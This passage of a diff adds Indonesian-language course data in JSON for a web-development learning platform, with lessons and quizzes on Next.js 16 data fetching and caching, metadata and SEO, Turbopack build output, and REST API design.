+              "Untuk membersihkan cache halaman rute terkait dan memerintahkan Next.js memuat ulang data segar dari database agar tampilan UI langsung terbarui.",
+              "Untuk mematikan server database.",
+              "Untuk mengenkripsi password user.",
+              "Untuk mengunduh file log sistem."
+            ],
+            "correctIndex": 0,
+            "explanation": "revalidatePath membersihkan cache server untuk path yang ditentukan sehingga permintaan berikutnya mendapatkan representasi data terbaru."
+          },
+          {
+            "id": "q-16-3-3",
+            "question": "Hook apakah di React 19 / Next.js 16 yang digunakan untuk membaca status isPending (loading) dan nilai return status dari sebuah Server Action?",
+            "options": [
+              "useActionState (atau useFormState)",
+              "useServerEffect",
+              "useDatabaseQuery",
+              "useNextMutation"
+            ],
+            "correctIndex": 0,
+            "explanation": "useActionState mengelola state pengembalian aksi dan menyediakan boolean isPending untuk umpan balik visual submit form."
+          }
+        ]
+      },
+      {
+        "id": "lesson-16-4",
+        "stageId": "stage-16",
+        "slug": "data-fetching-dan-caching-next16",
+        "title": "Data Fetching, Caching & Revalidasi di Next.js 16",
+        "titleEn": "Next.js 16 Data Fetching & Caching",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Memahami model data fetching Next.js 16: async Server Components, opsi fetch (cache: 'force-cache' vs 'no-store'), Incremental Static Regeneration (ISR) via next.revalidate, dan Parallel Fetching.",
+        "prerequisites": [
+          "server-actions-dan-form-mutations"
+        ],
+        "learningObjectives": [
+          "Mengeksekusi data fetching langsung di dalam async Server Components.",
+          "Menerapkan strategi caching: Static Data (force-cache) vs Dynamic Data (no-store).",
+          "Menerapkan Incremental Static Regeneration (ISR) berbasis waktu menggunakan `{ next: { revalidate: 60 } }`.",
+          "Menjalankan Parallel Data Fetching menggunakan Promise.all untuk mencegah Request Waterfalls."
+        ],
+        "whyMatters": "Memahami strategi caching Next.js menjamin website Anda secepat kilat (static response) namun selalu menyajikan data terbaru saat dibutuhkan.",
+        "careerContext": "Arsitektur caching dan ISR adalah keunggulan kompetitif utama Next.js untuk website e-commerce dan portal berita raksasa.",
+        "commonMistakes": [
+          "Menciptakan Request Waterfall (melakukan `await fetchA()` lalu `await fetchB()` secara sekuensial alih-alih `Promise.all`).",
+          "Tidak menyetel revalidasi pada halaman dinamis sehingga user melihat data kadaluarsa."
+        ],
+        "keyTerms": [
+          {
+            "term": "Incremental Static Regeneration (ISR)",
+            "definition": "Teknik membuat atau memperbarui halaman statis di latar belakang setelah interval waktu tertentu tanpa perlu build ulang seluruh website."
+          },
+          {
+            "term": "Request Waterfall",
+            "definition": "Pola anti-performa di mana permintaan jaringan saling menunggu satu sama lain secara beruntun lambat."
+          },
+          {
+            "term": "revalidate",
+            "definition": "Opsi waktu (dalam detik) sebelum cache respon data disegarkan ulang di background."
+          }
+        ],
+        "contentMd": "# Data Fetching, Caching & Revalidasi di Next.js 16\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari strategi **Data Fetching di Next.js 16**: bagaimana melakukan fetch data langsung di dalam **async Server Components**, opsi caching (**`force-cache`** vs **`no-store`**), **Incremental Static Regeneration (ISR)**, serta mencegah **Request Waterfalls**.\n\n## Mengapa Konsep Ini Penting?\nApakah Anda ingin halaman artikel Anda secepat file HTML statis ($< 50$ms) tetapi otomatis terbarui jika ada revisi berita setiap 60 detik? Next.js menyediakan sistem caching bertingkat paling canggih di dunia web modern.\n\n## 1. Data Fetching di Async Server Components\nAnda tidak lagi memerlukan `useEffect` atau `useState`. Komponen Anda adalah fungsi `async` murni:\n\n```tsx\n// File: app/articles/page.tsx (Server Component)\nexport default async function ArticlesPage() {\n  // Fetch berjalan langsung di server:\n  const res = await fetch(\"https://api.belajarinaja.com/v1/articles\");\n  const articles = await res.json();\n\n  return (\n    <main className=\"p-6\">\n      <h1 className=\"text-2xl font-bold\">Daftar Artikel</h1>\n      {articles.map((item: any) => (\n        <article key={item.id} className=\"my-2\">\n          <h2>{item.title}</h2>\n        </article>\n      ))}\n    </main>\n  );\n}\n```\n\n## 2. Tiga Strategi Caching Data\n\n### A. Static Data Caching (Default - Sangat Kencang)\nData di-cache permanen pada saat proses build:\n```typescript\n// Di-cache selamanya (Static Data):\nfetch(\"https://api.belajarinaja.com/v1/faq\", { cache: \"force-cache\" });\n```\n\n### B. Dynamic Data Fetching (Selalu Segar di Setiap Request)\nData tidak di-cache sama sekali, selalu diambil langsung dari server:\n```typescript\n// Selalu segar di setiap klik/kunjungan halaman (Dynamic Data):\nfetch(\"https://api.belajarinaja.com/v1/stock\", { cache: \"no-store\" });\n```\n\n### C. Incremental Static Regeneration (ISR - Standar Emas Industri)\nHalaman disajikan super kencang dari cache statis, dan diperbarui otomatis di background setiap $N$ detik:\n```typescript\n// Perbarui cache di latar belakang setiap 60 DETIK:\nfetch(\"https://api.belajarinaja.com/v1/articles\", { \n  next: { revalidate: 60 } \n});\n```\n\n## 3. Mencegah Request Waterfalls (Parallel Fetching)\nJangan menunggu request kedua setelah request pertama selesai secara sekuensial lambat! Tembakkan keduanya secara paralel:\n\n```tsx\nexport default async function DashboardPage() {\n  // TEMBAKKAN PARALEL BERSAMAAN:\n  const userPromise = fetchUserData();\n  const coursesPromise = fetchUserCourses();\n\n  // Tunggu keduanya selesai simultan:\n  const [user, courses] = await Promise.all([userPromise, coursesPromise]);\n\n  return <DashboardView user={user} courses={courses} />;\n}\n```\n\n## Kesalahan Umum Pemula\n- **Membuat Request Waterfall**: Menulis `const a = await getA(); const b = await getB();` yang memakan waktu $2s + 2s = 4s$. Selalu gunakan `Promise.all` untuk data independen ($2s$ total).\n\n## Praktik Mandiri\n1. Buat halaman kursus dengan opsi `next: { revalidate: 30 }`.\n2. Amati bagaimana data tetap disajikan instan dari cache dan otomatis terbarui setelah 30 detik.\n\n## Ringkasan\n- Data fetching dilakukan secara deklaratif di dalam **async Server Components**.\n- **`force-cache`** untuk data statis permanen.\n- **`no-store`** untuk data dinamis real-time (tanpa cache).\n- **`next: { revalidate: N }` (ISR)** menyajikan cache kencang dengan pembaruan otomatis di latar belakang.\n- Gunakan **`Promise.all`** untuk fetching data paralel.",
+        "quizzes": [
+          {
+            "id": "q-16-4-1",
+            "question": "Opsi konfigurasi fetch manakah yang digunakan untuk mengaktifkan Incremental Static Regeneration (ISR) agar cache halaman statis diperbarui di latar belakang setiap 60 detik?",
+            "options": [
+              "fetch(url, { next: { revalidate: 60 } })",
+              "fetch(url, { cache: 'no-store' })",
+              "fetch(url, { isr: true })",
+              "fetch(url, { reloadInterval: 60 })"
+            ],
+            "correctIndex": 0,
+            "explanation": "next.revalidate menetapkan interval waktu (dalam detik) masa berlaku cache data sebelum Next.js merevalidasinya di latar belakang (ISR)."
+          },
+          {
+            "id": "q-16-4-2",
+            "question": "Apa akibat dari membuat 'Request Waterfall' saat mengambil data profil dan data transaksi di dalam sebuah Server Component?",
+            "options": [
+              "Waktu loading halaman menjadi lambat karena request kedua terpaksa menunggu request pertama selesai secara sekuensial beruntun (misal 2 detik + 2 detik = 4 detik).",
+              "Database akan menolak koneksi.",
+              "Browser akan mengalami crash seketika.",
+              "File CSS akan hilang."
+            ],
+            "correctIndex": 0,
+            "explanation": "Waterfall blocking mengakumulasi total durasi latency jaringan; parallel fetching via Promise.all memangkas durasi menjadi sepanjang request terpanjang."
+          },
+          {
+            "id": "q-16-4-3",
+            "question": "Opsi caching apakah yang harus disetel pada fungsi fetch jika Anda ingin mengambil data harga saham yang WAJIB selalu segar di setiap request tanpa di-cache?",
+            "options": [
+              "{ cache: 'no-store' }",
+              "{ cache: 'force-cache' }",
+              "{ cache: 'default' }",
+              "{ cache: 'forever' }"
+            ],
+            "correctIndex": 0,
+            "explanation": "cache: 'no-store' menginstruksikan Next.js untuk selalu mengambil data langsung dari origin server pada setiap permintaan (Dynamic Rendering)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-16-5",
+        "stageId": "stage-16",
+        "slug": "metadata-api-seo-dan-social-share",
+        "title": "Metadata API, Dynamic SEO & Social Sharing (OG Tags)",
+        "titleEn": "Metadata API, SEO & OpenGraph",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Mengoptimalkan SEO teknis dengan Metadata API Next.js: Static metadata, Dynamic metadata (`generateMetadata`), OpenGraph social share cards, Twitter cards, dan sitemap.xml / robots.txt.",
+        "prerequisites": [
+          "data-fetching-dan-caching-next16"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan Static Metadata objek pada file layout.tsx dan page.tsx.",
+          "Menerapkan fungsi generateMetadata() untuk menghasilkan judul, deskripsi, dan gambar OpenGraph dinamis dari database.",
+          "Menyusun kartu pratinjau sosial (Open Graph & Twitter Cards) yang menarik saat tautan dibagikan di WhatsApp/Twitter.",
+          "Membuat sitemap.ts dan robots.ts otomatis untuk mesin pencari Google."
+        ],
+        "whyMatters": "Metadata yang tepat adalah penentu utama apakah tautan website Anda tampil profesional dengan banner pratinjau saat dibagikan di media sosial dan mendapat peringkat teratas di Google.",
+        "careerContext": "Setiap peluncuran produk komersial mewajibkan implementasi Dynamic SEO dan Open Graph metadata yang sempurna.",
+        "commonMistakes": [
+          "Lupa menyertakan URL gambar absolut (`https://...`) pada properti `openGraph.images` (media sosial menolak gambar dengan path relatif seperti `/og.jpg`).",
+          "Menduplikasi fetch data yang sama di `generateMetadata` dan di fungsi komponen (Next.js otomatis melakukan deduplikasi fetch request!)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Metadata API",
+            "definition": "API bawaan Next.js untuk mendefinisikan tag `<head>` HTML (title, meta description, canonical) secara terstruktur dan type-safe."
+          },
+          {
+            "term": "generateMetadata()",
+            "definition": "Fungsi async Next.js untuk menghasilkan metadata dinamis berdasarkan parameter URL rute."
+          },
+          {
+            "term": "Open Graph (OG Tags)",
+            "definition": "Protokol standar untuk mengontrol bagaimana judul, deskripsi, dan gambar pratinjau tampil saat link dibagikan di media sosial."
+          }
+        ],
+        "contentMd": "# Metadata API, Dynamic SEO & Social Sharing (OG Tags)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari **Next.js Metadata API**: mendefinisikan **Static Metadata**, membuat **Dynamic Metadata (`generateMetadata`)** berbasis data database, mengatur kartu **Open Graph (Social Share)**, serta membuat **`sitemap.ts`** dan **`robots.ts`**.\n\n## Mengapa Konsep Ini Penting?\nSaat Anda membagikan link kursus BelajarinAja ke WhatsApp, Telegram, atau LinkedIn, Anda ingin link tersebut tampil dengan foto banner yang indah, judul yang tebal, dan deskripsi yang menarik (*Rich Preview Card*). Di Next.js, semua itu dikelola melalui Metadata API yang type-safe.\n\n## 1. Static Metadata (Untuk Halaman Statis)\n\n```typescript\n// File: app/about/page.tsx\nimport type { Metadata } from \"next\";\n\nexport const metadata: Metadata = {\n  title: \"Tentang Kami | BelajarinAja\",\n  description: \"Platform pembelajaran web development nomor 1 di Indonesia dengan kurikulum industri terverifikasi.\",\n  keywords: [\"belajar web\", \"frontend\", \"react\", \"nextjs\"],\n  openGraph: {\n    title: \"Tentang BelajarinAja\",\n    description: \"Platform pembelajaran web development nomor 1 di Indonesia.\",\n    url: \"https://belajarinaja.com/about\",\n    siteName: \"BelajarinAja\",\n    images: [\n      {\n        url: \"https://belajarinaja.com/og-about.jpg\", // WAJIB URL ABSOLUT!\n        width: 1200,\n        height: 630,\n        alt: \"Tim BelajarinAja\",\n      }\n    ],\n    locale: \"id_ID\",\n    type: \"website\",\n  },\n};\n```\n\n## 2. Dynamic Metadata dengan `generateMetadata`\nUntuk halaman berparameter dinamis seperti `app/courses/[slug]/page.tsx`:\n\n```typescript\n// File: app/courses/[slug]/page.tsx\nimport type { Metadata } from \"next\";\nimport { db } from \"@/lib/db\";\n\ninterface Props {\n  params: Promise<{ slug: string }>;\n}\n\nexport async function generateMetadata({ params }: Props): Promise<Metadata> {\n  const { slug } = await params;\n  const course = await db.course.findUnique({ where: { slug } });\n\n  if (!course) {\n    return { title: \"Kursus Tidak Ditemukan | BelajarinAja\" };\n  }\n\n  return {\n    title: `${course.title} | BelajarinAja`,\n    description: course.description,\n    openGraph: {\n      title: course.title,\n      description: course.description,\n      images: [course.thumbnailUrl || \"https://belajarinaja.com/default-og.jpg\"],\n    },\n    twitter: {\n      card: \"summary_large_image\",\n      title: course.title,\n      description: course.description,\n    }\n  };\n}\n```\n\n> **Catatan Efisiensi**: Next.js secara otomatis melakukan **Deduplikasi Request Fetch**. Jika Anda memanggil `fetchCourse(slug)` di `generateMetadata` dan di `page component`, request jaringan **hanya dieksekusi 1 kali** di balik layar!\n\n## 3. Otomasi Sitemap & Robots untuk Mesin Pencari Google\n\n```typescript\n// File: app/robots.ts\nimport type { MetadataRoute } from \"next\";\n\nexport default function robots(): MetadataRoute.Robots {\n  return {\n    rules: {\n      userAgent: \"*\",\n      allow: \"/\",\n      disallow: \"/admin/\", // Lindungi rute admin dari crawler\n    },\n    sitemap: \"https://belajarinaja.com/sitemap.xml\",\n  };\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memakai URL relatif pada Open Graph Image**: Menulis `images: ['/banner.jpg']`. WhatsApp dan Twitter tidak bisa membaca path relatif; URL gambar **WAJIB diawali `https://...`**.\n\n## Praktik Mandiri\n1. Buat fungsi `generateMetadata` untuk detail artikel blog.\n2. Uji pratinjau kartu sosial menggunakan tools gratis seperti [opengraph.xyz](https://www.opengraph.xyz).\n\n## Ringkasan\n- Gunakan objek **`metadata`** untuk halaman statis dan fungsi **`generateMetadata()`** untuk halaman dinamis.\n- Gambar Open Graph (`og:image`) **wajib menggunakan URL absolut (`https://...`)**.\n- Next.js otomatis menduplikasi request data fetching antara metadata dan halaman.\n- Manfaatkan **`sitemap.ts`** dan **`robots.ts`** untuk indexasi mesin pencari Google.",
+        "quizzes": [
+          {
+            "id": "q-16-5-1",
+            "question": "Fungsi khusus apakah di Next.js App Router yang digunakan untuk menghasilkan tag metadata (title, description, og:image) secara dinamis berdasarkan data database dari rute [slug]?",
+            "options": [
+              "export async function generateMetadata({ params }) { ... }",
+              "export function getDynamicSEO() { ... }",
+              "export async function setHeadTags() { ... }",
+              "export function metadataHandler() { ... }"
+            ],
+            "correctIndex": 0,
+            "explanation": "generateMetadata() adalah fungsi khusus Next.js untuk menghasilkan objek Metadata secara asinkron berbasis parameter rute."
+          },
+          {
+            "id": "q-16-5-2",
+            "question": "Aturan format apakah yang WAJIB dipenuhi pada properti gambar Open Graph (openGraph.images) agar banner pratinjau dapat tampil sempurna saat link dibagikan di WhatsApp atau Twitter?",
+            "options": [
+              "URL gambar WAJIB berupa URL absolut lengkap dengan protokol (contoh: https://domain.com/og.jpg), bukan path relatif.",
+              "Format gambar harus berekstensi .bmp.",
+              "Gambar harus berukuran tepat 10x10 pixel.",
+              "Gambar harus diunggah langsung ke server WhatsApp."
+            ],
+            "correctIndex": 0,
+            "explanation": "Crawler platform media sosial membutuhkan Absolute URL lengkap untuk dapat mengunduh dan merender pratinjau gambar Open Graph."
+          },
+          {
+            "id": "q-16-5-3",
+            "question": "Apa yang terjadi jika Anda melakukan pemanggilan fetch data yang sama di dalam generateMetadata() dan di dalam komponen utama page.tsx pada rute yang sama?",
+            "options": [
+              "Next.js secara otomatis melakukan Request Deduplication (Memoization) sehingga request jaringan hanya dieksekusi 1 kali tanpa memboroskan beban server.",
+              "Server akan melempar error konflik ganda.",
+              "Kecepatan website akan melambat 10 kali lipat.",
+              "Database akan menghapus data tersebut."
+            ],
+            "correctIndex": 0,
+            "explanation": "React dan Next.js secara cerdas me-memoize fetch request yang identik dalam satu siklus render, menghindari penembakan ganda ke API/DB."
+          }
+        ]
+      },
+      {
+        "id": "lesson-16-6",
+        "stageId": "stage-16",
+        "slug": "turbopack-dan-arsitektur-produksi-next16",
+        "title": "Turbopack, Build Optimization & Arsitektur Produksi",
+        "titleEn": "Turbopack & Production Architecture",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Memahami engine bundler Turbopack (berbasis Rust), proses kompilasi build (next build), Static Generation vs Dynamic Rendering, Serverless vs Edge runtime, dan optimasi bundle analyzer.",
+        "prerequisites": [
+          "metadata-api-seo-dan-social-share"
+        ],
+        "learningObjectives": [
+          "Menjelaskan arsitektur bundler generasi baru Turbopack yang ditulis dalam bahasa Rust.",
+          "Menganalisis hasil ringkasan rute pada proses `next build` (Static '○' vs Dynamic 'ƒ').",
+          "Membedakan lingkungan eksekusi Node.js Serverless Runtime vs Edge Runtime.",
+          "Menerapkan optimasi package bundling menggunakan `@next/bundle-analyzer`."
+        ],
+        "whyMatters": "Memahami arsitektur produksi menjamin aplikasi Anda siap di-deploy ke Vercel atau Docker dengan performa puncak dan biaya server minimal.",
+        "careerContext": "Pengetahuan mendalam tentang runtime architecture dan build optimization adalah syarat mutlak posisi Senior Fullstack Developer.",
+        "commonMistakes": [
+          "Tidak menyadari bahwa menggunakan `cookies()` atau `headers()` otomatis mengubah sebuah rute dari Static menjadi Dynamic Rendering.",
+          "Memasukkan package berat yang hanya berjalan di server ke dalam Client Component bundle."
+        ],
+        "keyTerms": [
+          {
+            "term": "Turbopack",
+            "definition": "Engine bundler berkinerja ultra tinggi pengganti Webpack yang dibangun dengan Rust untuk ekosistem Next.js."
+          },
+          {
+            "term": "Static Generation (○)",
+            "definition": "Halaman yang di-render menjadi HTML statis sekali pada saat build time (biaya komputasi 0 di runtime)."
+          },
+          {
+            "term": "Dynamic Rendering (ƒ)",
+            "definition": "Halaman yang di-render di server secara dinamis pada setiap ada request pengguna masuk."
+          },
+          {
+            "term": "Edge Runtime",
+            "definition": "Lingkungan eksekusi super ringan berbasis V8 engine yang berjalan di server jaringan CDN terdekat dengan pengguna."
+          }
+        ],
+        "contentMd": "# Turbopack, Build Optimization & Arsitektur Produksi\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan membedah arsitektur produksi **Next.js 16**: engine bundler baru **Turbopack (Rust)**, membaca output **`next build`** (**Static `○` vs Dynamic `ƒ`**), perbedaan **Node.js Serverless vs Edge Runtime**, serta analisis bundle size.\n\n## Mengapa Konsep Ini Penting?\nWebsite yang cepat di komputer lokal developer bisa saja lambat atau boros biaya di server produksi jika Anda tidak memahami bagaimana Next.js mengompilasi dan mengeksekusi rute aplikasi Anda.\n\n## 1. Revolusi Bundler: Turbopack (Pengganti Webpack)\nNext.js 16 menggunakan **Turbopack**, bundler modern yang dibangun dari nol menggunakan bahasa pemrograman **Rust**:\n- **700x Lebih Cepat** daripada Webpack tradisional pada proyek berskala besar.\n- **Fast Refresh Instan**: Perubahan kode di editor langsung terpantau di browser dalam hitungan beberapa milidetik.\n- Jalankan di lokal dengan perintah: `next dev --turbo`.\n\n## 2. Membaca Output Perintah `next build`\nSaat Anda menjalankan `npm run build`, Next.js menampilkan peta arsitektur rute:\n\n```text\nRoute (app)                              Size     First Load JS\n┌ ○ /                                    5.2 kB         85.1 kB  (Static - Super Kencang!)\n├ ○ /about                               3.1 kB         83.0 kB  (Static)\n├ ƒ /api/checkout                        0 B            80.0 kB  (Dynamic - Butuh Server)\n└ ƒ /dashboard                           8.4 kB         88.3 kB  (Dynamic - Membaca Cookies/Session)\n+ First Load JS shared by all            79.9 kB\n  ├ chunks/framework.js                  45.2 kB\n  └ chunks/main.js                       34.7 kB\n\n○  (Static)   prerendered as static content\nƒ  (Dynamic)  server-rendered on demand\n```\n\n- **Simbol `○` (Static)**: Halaman di-render menjadi HTML sekali saat build. Kecepatan loading instan dan biaya server gratis (bisa di-cache di CDN global).\n- **Simbol `ƒ` (Dynamic)**: Halaman dihitung ulang di server pada setiap kunjungan karena menggunakan Dynamic Functions (seperti `cookies()`, `headers()`, atau `searchParams`).\n\n## 3. Node.js Serverless Runtime vs Edge Runtime\n\n```text\n┌─────────────────────────────────────────────────────────────┐\n│ 1. NODE.JS SERVERLESS RUNTIME (Default)                     │\n│ - Ekosistem Node.js Lengkap (Mendukung semua npm packages)  │\n│ - Akses penuh ke Native Modules (fs, net, crypto)           │\n│ - Cocok untuk Query Database Kompleks & ORM (Prisma)        │\n├─────────────────────────────────────────────────────────────┤\n│ 2. EDGE RUNTIME (Ringan & Cepat di Seluruh Dunia)           │\n│ - Berjalan di Server CDN terdekat dengan lokasi fisik user  │\n│ - Waktu Booting 0 Milidetik (No Cold Starts)                │\n│ - Cocok untuk Middleware Otentikasi, Geo-Routing, Redirect  │\n└─────────────────────────────────────────────────────────────┘\n```\n\n## 4. Menganalisis Ukuran Bundle (`@next/bundle-analyzer`)\nGunakan bundle analyzer untuk mendeteksi library raksasa yang tidak sengaja masuk ke browser client:\n```bash\nANALYZE=true npm run build\n# Membuka visualisasi interaktif ukuran setiap file chunk JavaScript\n```\n\n## Kesalahan Umum Pemula\n- **Memanggil `cookies()` di halaman yang seharusnya statis**: Membaca cookie di halaman informasi umum (seperti FAQ) akan mengubah halaman tersebut menjadi Dynamic (`ƒ`) yang membebani komputasi server.\n\n## Praktik Mandiri\n1. Jalankan `npm run build` pada proyek Next.js Anda.\n2. Periksa daftar rute terminal Anda dan pastikan halaman publik bertanda `○` (Static).\n\n## Ringkasan\n- **Turbopack (Rust)** mempercepat kompilasi dan hot-reload hingga ratusan kali lipat.\n- **Static Routes (`○`)** disajikan instan dari cache CDN global.\n- **Dynamic Routes (`ƒ`)** dieksekusi di server saat ada request yang membutuhkan data real-time / sesi auth.\n- Gunakan **Node.js Runtime** untuk operasi database/ORM dan **Edge Runtime** untuk Middleware kecepatan tinggi.",
+        "quizzes": [
+          {
+            "id": "q-16-6-1",
+            "question": "Apa perbedaan paling mendasar antara rute Static ('○') dan rute Dynamic ('ƒ') pada output laporan perintah next build?",
+            "options": [
+              "Rute Static di-render menjadi HTML sekali saat proses build dan disajikan super cepat dari CDN global, sedangkan rute Dynamic dihitung ulang di server pada setiap permintaan pengguna masuk.",
+              "Rute Static tidak bisa dibuka di smartphone.",
+              "Rute Dynamic tidak mendukung format gambar.",
+              "Rute Static hanya berlaku selama 24 jam."
+            ],
+            "correctIndex": 0,
+            "explanation": "Static generation menghasilkan respon HTML statis dengan biaya komputasi 0 di runtime, sedangkan Dynamic rendering dieksekusi on-demand per request."
+          },
+          {
+            "id": "q-16-6-2",
+            "question": "Fungsi dinamis manakah di Next.js yang jika dipanggil di dalam komponen halaman akan secara otomatis mengubah rute tersebut menjadi Dynamic Rendering ('ƒ')?",
+            "options": [
+              "Memanggil cookies(), headers(), atau membaca searchParams dinamis.",
+              "Memanggil console.log()",
+              "Menggunakan tag <img>",
+              "Menambahkan class Tailwind CSS"
+            ],
+            "correctIndex": 0,
+            "explanation": "Dynamic APIs seperti cookies() dan headers() bergantung pada konteks request user spesifik, sehingga memaksa server me-render halaman secara dinamis."
+          },
+          {
+            "id": "q-16-6-3",
+            "question": "Apa keunggulan arsitektur bundler Turbopack yang dibangun di atas bahasa Rust pada Next.js 16 dibandingkan Webpack lama?",
+            "options": [
+              "Waktu kompilasi dan proses Fast Refresh lokal berkecepatan ultra tinggi (hingga ratusan kali lebih cepat pada basis kode besar).",
+              "Turbopack mengubah bahasa JavaScript menjadi Python.",
+              "Turbopack menghapus seluruh bug dari kode secara otomatis.",
+              "Turbopack tidak memerlukan koneksi listrik."
+            ],
+            "correctIndex": 0,
+            "explanation": "Turbopack mengoptimalkan performa bundling developer tooling dengan arsitektur native multi-threaded berbasis Rust."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-17",
+    "orderIndex": 17,
+    "titleId": "Backend API Development & Validation (REST & Zod)",
+    "titleEn": "Backend API Development & Validation (REST & Zod)",
+    "category": "Backend",
+    "description": "Membangun REST API backend tangguh dengan Next.js Route Handlers (GET, POST, PUT, DELETE), validasi skema data dengan Zod (parse, safeParse), Rate Limiting, dan error handling terstruktur.",
+    "descriptionEn": "Build robust REST APIs with Route Handlers, schema validation with Zod, Rate Limiting, and structured error handling.",
+    "lessons": [
+      {
+        "id": "lesson-17-1",
+        "stageId": "stage-17",
+        "slug": "rest-api-design-dan-http-semantics",
+        "title": "Prinsip Desain REST API & Semantik HTTP",
+        "titleEn": "REST API Design & HTTP Semantics",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 18,
+        "description": "Merancang arsitektur RESTful API profesional: Resource Naming (kata benda jamak), HTTP Verbs (GET, POST, PUT, PATCH, DELETE), Status Codes semantik, Idempotency, dan Statelessness.",
+        "prerequisites": [
+          "turbopack-dan-arsitektur-produksi-next16"
+        ],
+        "learningObjectives": [
+          "Menerapkan prinsip Resource-Oriented URL Naming (contoh: `/api/v1/courses`, `/api/v1/courses/:id/lessons`).",
+          "Membedakan semantik HTTP Verbs: PUT (penggantian penuh) vs PATCH (pembaruan parsial).",
+          "Menjelaskan konsep Idempotency pada HTTP Methods (GET, PUT, DELETE bersifat idempotent; POST tidak).",
+          "Menerapkan struktur JSON response standar industri (`{ success: true, data: ..., error: ... }`)."
+        ],
+        "whyMatters": "Desain REST API yang bersih dan konsisten memudahkan integrasi frontend, aplikasi mobile (iOS/Android), dan developer pihak ketiga.",
+        "careerContext": "Kemampuan merancang arsitektur API yang elegan adalah syarat mutlak Backend / Fullstack Developer profesional.",
+        "commonMistakes": [
+          "Menggunakan kata kerja di dalam endpoint URL (seperti `/api/getUsers` atau `/api/deleteCourse/1` alih-alih `GET /api/users` dan `DELETE /api/courses/1`).",
+          "Mengembalikan kode status `200 OK` untuk respon yang sebenarnya mengalami error kegagalan."
+        ],
+        "keyTerms": [
+          {
+            "term": "REST (Representational State Transfer)",
+            "definition": "Gaya arsitektur standar komunikasi web berbasis resource stateless dan kata kerja HTTP standar."
+          },
+          {
+            "term": "Idempotency",
+            "definition": "Sifat operasi di mana mengeksekusi request yang sama berkali-kali menghasilkan efek status server yang sama persis seperti mengeksekusinya 1 kali."
+          },
+          {
+            "term": "PATCH vs PUT",
+            "definition": "PUT menggantikan seluruh entitas data; PATCH hanya memperbarui sebagian properti yang dikirimkan."
+          }
+        ],
+        "contentMd": "# Prinsip Desain REST API & Semantik HTTP\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari standar perancangan **RESTful API Profesional**: aturan penamaan URL berbasis **Resource Naming**, semantik **HTTP Verbs**, konsep **Idempotency**, perbedaan kritis **PUT vs PATCH**, serta standarisasi format respon JSON.\n\n## Mengapa Konsep Ini Penting?\nAPI adalah kontrak komunikasi antara frontend dan backend. API yang dirancang buruk (seperti `POST /api/hapusSemuaDataUser`) sangat membingungkan, sulit dirawat, dan rentan celah keamanan.\n\n## 1. Aturan Emas Resource Naming (Kata Benda Jamak)\n- **Gunakan Kata Benda Jamak (*Plural Nouns*)**: Selalu gunakan kata benda yang merepresentasikan entitas data, **JANGAN PERNAH gunakan kata kerja**.\n- Gunakan HTTP Method untuk menyatakan tindakan!\n\n| Tindakan | URL Endpoint yang SALAH (Kuno) | Desain RESTful yang BENAR (Standar) |\n| :--- | :--- | :--- |\n| Ambil Semua Kursus | `GET /api/getAllCourses` | **`GET /api/v1/courses`** |\n| Ambil 1 Kursus | `GET /api/getCourse?id=12` | **`GET /api/v1/courses/12`** |\n| Buat Kursus Baru | `POST /api/createNewCourse` | **`POST /api/v1/courses`** |\n| Update Kursus | `POST /api/updateCourse/12` | **`PATCH /api/v1/courses/12`** |\n| Hapus Kursus | `GET /api/deleteCourse/12` (Bahaya!)| **`DELETE /api/v1/courses/12`** |\n\n## 2. Perbedaan Kritis: PUT vs PATCH\n- **`PUT` (Penggantian Total / *Replace*)**: Klien mengirimkan entitas objek secara utuh. Properti lama yang tidak dikirimkan akan dihapus atau di-reset menjadi nilai default.\n- **`PATCH` (Pembaruan Parsial / *Partial Update*)**: Klien HANYA mengirimkan properti yang ingin diubah (misal hanya mengirim `{ harga: 150000 }`), sementara nama dan deskripsi tetap aman tidak berubah.\n\n## 3. Konsep Idempotency (Keamanan Pengulangan Request)\n> **Idempotent** berarti: Mengeksekusi permintaan 1 kali atau 100 kali akan menghasilkan kondisi akhir database yang sama persis.\n\n- **`GET`** (Idempotent): Membaca data 10x tidak mengubah database.\n- **`DELETE`** (Idempotent): Menghapus ID 10 pertama kali menghapus data; 9 kali berikutnya data tetap terhapus (hasil akhir database sama).\n- **`POST` (NON-Idempotent)**: Mengirim POST 10x akan menciptakan **10 transaksi baru yang berbeda** (dapat memicu tagihan ganda jika jaringan terputus!).\n\n## 4. Standar Format Respon JSON Perusahaan\n\n```json\n/* Respon SUKSES (HTTP 200 / 201) */\n{\n  \"success\": true,\n  \"data\": {\n    \"id\": \"c-101\",\n    \"title\": \"Mastering Next.js 16\"\n  },\n  \"message\": \"Kursus berhasil dibuat\"\n}\n\n/* Respon GAGAL (HTTP 400 / 404 / 500) */\n{\n  \"success\": false,\n  \"error\": {\n    \"code\": \"VALIDATION_ERROR\",\n    \"details\": [\"Email tidak valid\", \"Password minimal 8 karakter\"]\n  }\n}\n```\n\n## Kesalahan Umum Pemula\n- **Memakai GET untuk mutasi penghapusan**: Menaruh link `<a href=\"/api/delete?id=5\">`. Crawler mesin pencari Google bisa secara tidak sengaja mengklik link tersebut dan menghapus seluruh database Anda! Selalu gunakan method **`DELETE`** atau **`POST`**.\n\n## Praktik Mandiri\n1. Rancang arsitektur URL REST API untuk sistem Toko Online: Produk, Kategori, Review Produk, dan Keranjang Belanja.\n\n## Ringkasan\n- Gunakan **Kata Benda Jamak** pada URL (contoh: `/api/v1/products`).\n- Gunakan HTTP Verbs yang tepat: **GET** (baca), **POST** (buat), **PATCH** (ubah sebagian), **DELETE** (hapus).\n- **PUT** mengganti seluruh objek; **PATCH** memperbarui sebagian field saja.\n- Selalu kembalikan **HTTP Status Code semantik** yang sesuai dengan hasil eksekusi.",
+        "quizzes": [
+          {
+            "id": "q-17-1-1",
